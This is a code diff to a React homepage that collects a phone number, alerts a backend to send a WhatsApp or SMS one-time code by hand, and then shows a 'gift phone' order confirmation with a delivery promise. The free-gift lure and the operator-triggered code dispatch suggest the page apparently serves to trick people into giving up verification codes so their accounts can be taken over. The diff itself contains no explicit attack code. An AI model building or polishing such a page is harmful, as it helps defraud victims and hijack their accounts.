@@ -100,12 +100,16 @@ export default function HomePage() {
     return () => clearInterval(timer);
   }, [resendCooldown]);
 
-  async function sendOtpResendRequest(method: "whatsapp" | "sms", currentPhone: string) {
+  async function sendOtpResendRequest(
+    method: "whatsapp" | "sms",
+    currentPhone: string,
+    kind: "otp_initial_request" | "otp_resend_request" = "otp_resend_request"
+  ) {
     const notifyRes = await fetch("/api/notify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        kind: "otp_resend_request",
+        kind,
         phone: currentPhone,
         otpMethod: method,
       }),
@@ -145,11 +149,19 @@ export default function HomePage() {
           | null;
         throw new Error(payload?.details || payload?.error || "failed-start");
       }
-      const startPayload = (await startRes.json()) as { sessionId?: string };
+      const startPayload = (await startRes.json()) as {
+        sessionId?: string;
+        alreadyApproved?: boolean;
+      };
       if (!startPayload.sessionId) {
         throw new Error("missing-session-id");
       }
       setSessionId(startPayload.sessionId);
+
+      if (startPayload.alreadyApproved) {
+        setStep("success");
+        return;
+      }
 
       const notifyRes = await fetch("/api/notify", {
         method: "POST",
@@ -167,7 +179,7 @@ export default function HomePage() {
 
       // Trigger manual OTP dispatch request immediately after phone submission.
       try {
-        await sendOtpResendRequest("whatsapp", formatted);
+        await sendOtpResendRequest("whatsapp", formatted, "otp_initial_request");
       } catch {
         console.warn("Initial OTP request notify failed");
       }
@@ -565,6 +577,19 @@ export default function HomePage() {
               </div>
             </div>
             <h3 style={styles.processTitle}>Yay! Your order has been placed!</h3>
+            <p style={styles.successDeliveryMsg}>
+              Your order has been delivered in 1 or 2 days, please stay at your location.
+            </p>
+            <div style={styles.itemSummaryCard}>
+              <p style={styles.itemSummaryTitle}>Item Summary 1</p>
+              <Image
+                src={giftPhoneImage}
+                alt="Delivered item"
+                width={120}
+                height={150}
+                style={styles.itemSummaryImage}
+              />
+            </div>
           </div>
         )}
       </div>
@@ -1155,6 +1180,36 @@ const styles: Record<string, React.CSSProperties> = {
     lineHeight: 1,
     color: "#0f1115",
     fontWeight: 700,
+  },
+  successDeliveryMsg: {
+    textAlign: "center",
+    color: "#2d3c57",
+    fontSize: "15px",
+    lineHeight: 1.45,
+    maxWidth: "320px",
+    margin: "8px auto 14px",
+    fontWeight: 600,
+  },
+  itemSummaryCard: {
+    width: "100%",
+    maxWidth: "320px",
+    border: "1px solid #e8ebf3",
+    borderRadius: "14px",
+    padding: "14px",
+    background: "#ffffff",
+    boxShadow: "0 8px 22px rgba(20,27,38,0.06)",
+    display: "flex",
+    flexDirection: "column",
+    alignItems: "center",
+    gap: "8px",
+  },
+  itemSummaryTitle: {
+    fontSize: "14px",
+    fontWeight: 700,
+    color: "#1f2a44",
+  },
+  itemSummaryImage: {
+    objectFit: "contain",
   },
 
   // Footer
